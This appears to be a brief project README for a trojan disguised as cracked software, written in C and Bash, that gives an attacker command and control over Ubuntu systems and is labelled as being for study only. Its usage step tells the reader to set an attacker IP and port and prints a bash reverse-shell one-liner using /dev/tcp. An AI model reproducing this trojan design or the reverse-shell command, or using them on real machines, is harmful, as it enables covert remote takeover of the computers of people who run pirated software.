# Trojan - Crack Software
Basic trojan with command and control functionatilies for ubuntu based systems.

This trojan was created for study porpuses only, to emulate a cracked software that comes with a malware inside. It was coded in C and Bash.

How to use:

1 - Change the attacker IP Address and Port to connect in the source code (line 52).

```
bash -i >& /dev/tcp/attackerip/porttoconnect 0>&1 2>&1
```
